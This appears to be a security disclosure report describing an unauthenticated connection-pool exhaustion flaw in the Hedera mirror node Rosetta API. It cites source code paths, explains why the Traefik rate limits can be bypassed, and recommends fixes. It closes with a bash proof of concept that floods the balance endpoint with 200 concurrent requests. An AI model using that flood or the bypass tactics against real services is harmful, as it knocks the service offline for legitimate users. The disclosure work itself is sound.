### Title
Unauthenticated DB Connection Pool Exhaustion via Concurrent Alias-Based Lookups in `getCryptoEntity()`

### Summary
The `getCryptoEntity()` function in `rosetta/app/persistence/account.go` acquires a DB connection from the shared pool for every alias-based lookup with no application-level concurrency control. An unprivileged attacker can flood the endpoint with concurrent alias-based requests, saturating the pool's `MaxOpenConnections` limit (default: 100), causing legitimate requests to block waiting for a connection until the `statementTimeout` (default: 20s) fires, returning `ErrDatabaseError` to real users.

### Finding Description

**Exact code path:**

`getCryptoEntity()` unconditionally calls `GetDbWithContext()` on every invocation:

```go
// rosetta/app/persistence/account.go:229
db, cancel := ar.dbClient.GetDbWithContext(ctx)
defer cancel()
```

`GetDbWithContext()` in `rosetta/app/db/client.go` wraps the shared `*gorm.DB` with a context timeout (default 20s from `statementTimeout`):

```go
// rosetta/app/db/client.go:36
childCtx, cancel := context.WithTimeout(ctx, time.Duration(d.statementTimeout)*time.Second)
return d.db.WithContext(childCtx), cancel
```

The underlying `*sql.DB` pool is configured in `rosetta/app/db/db.go`:

```go
// rosetta/app/db/db.go:33
sqlDb.SetMaxOpenConns(dbConfig.Pool.MaxOpenConnections)  // default: 100
```

When `MaxOpenConnections` (100) is reached, Go's `database/sql` does **not** fail immediately — it blocks the goroutine waiting for a free connection. If the wait exceeds the 20s `statementTimeout` context deadline, the query fails and `getCryptoEntity()` returns `hErrors.ErrDatabaseError` to the caller.

The alias-based query is a `UNION ALL` across two tables:

```sql
-- rosetta/app/persistence/account.go:52-59
select id, deleted, key, timestamp_range from entity
where alias = @alias and timestamp_range @> @consensus_end
union all
select id, deleted, key, timestamp_range from entity_history
where alias = @alias and timestamp_range @> @consensus_end
order by timestamp_range desc
```

This query touches both `entity` and `entity_history` tables with a range containment operator (`@>`), which can be slow on large datasets, extending connection hold time and amplifying pool exhaustion.

**Why existing checks are insufficient:**

The only rate-limiting controls are in the Traefik ingress middleware defined in `charts/hedera-mirror-rosetta/values.yaml`:

```yaml
# charts/hedera-mirror-rosetta/values.yaml:152-160
- inFlightReq:
    amount: 5
    sourceCriterion:
      ipStrategy:
        depth: 1
- rateLimit:
    average: 10
    sourceCriterion:
      requestHost: true
```

These are **deployment-specific** (Helm chart only) and not enforced at the application layer. There is no rate-limiting, semaphore, or concurrency cap in the Rosetta Go service itself — `rosetta/app/middleware/` contains only `metrics.go`, `health.go`, and `trace.go`. An attacker accessing the service directly (bypassing Traefik) faces zero throttling. Even with Traefik, the per-IP `inFlightReq: 5` limit is trivially bypassed using multiple source IPs (botnet/VPNs), leaving only the global `rateLimit: average: 10` per `requestHost`. At 10 req/s with a 20s statement timeout, an attacker can hold up to 200 connection-slots — double the pool's 100-connection limit — causing pool exhaustion.

### Impact Explanation
Legitimate users querying account balances via alias receive `ErrDatabaseError` (HTTP 500) for the duration of the attack. The Rosetta API becomes unavailable for balance lookups, block queries, and transaction retrieval — all of which call `getCryptoEntity()` through `RetrieveBalanceAtBlock()`. No economic damage occurs, but the service is effectively griefed into unavailability. Severity: Medium (DoS/griefing, no funds at risk).

### Likelihood Explanation
Any unprivileged user can trigger this. No authentication is required for Rosetta API endpoints. The attack requires only an HTTP client capable of sending concurrent requests. Bypassing the per-IP Traefik limit requires multiple IPs (easily obtained via cloud VMs, proxies, or botnets). Deployments without Traefik (direct exposure) are fully unprotected. The attack is repeatable and cheap to sustain.

### Recommendation
1. **Application-level concurrency limit:** Add a semaphore or `golang.org/x/time/rate` rate limiter in the Rosetta HTTP middleware layer (alongside `metrics.go`) to cap concurrent in-flight DB-bound requests globally and per-IP, independent of the ingress layer.
2. **Pool wait timeout:** Set a `db.SetConnMaxIdleTime()` and use `context.WithTimeout` on the pool-acquisition step itself (separate from the query timeout) so that requests fail fast when the pool is exhausted rather than blocking for the full 20s.
3. **Query optimization:** Ensure `entity.alias` and `entity_history.alias` columns have appropriate GiST/B-tree indexes for the `timestamp_range @> @consensus_end` predicate to reduce per-connection hold time.
4. **Do not rely solely on Traefik:** The Helm chart middleware is not a security boundary — enforce limits at the application layer.

### Proof of Concept
```bash
# Precondition: Rosetta service accessible at localhost:5700, no Traefik in front
# Step 1: Generate a valid alias-based account identifier (any base32/hex alias)
ALIAS="0x1234567890abcdef1234567890abcdef12345678"

# Step 2: Flood with 200 concurrent balance requests using alias lookup
# Each request triggers getCryptoEntity() -> acquires a pool connection for up to 20s
for i in $(seq 1 200); do
  curl -s -X POST http://localhost:5700/account/balance \
    -H "Content-Type: application/json" \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"testnet\"},
         \"account_identifier\":{\"address\":\"${ALIAS}\"},
         \"block_identifier\":{\"index\":1}}" &
done
wait

# Step 3: Send a legitimate request — observe ErrDatabaseError (HTTP 500)
curl -X POST http://localhost:5700/account/balance \
  -H "Content-Type: application/json" \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"testnet"},
       "account_identifier":{"address":"0.0.100"},
       "block_identifier":{"index":1}}'
# Expected: {"code":500,"message":"Database error","retriable":true}
```
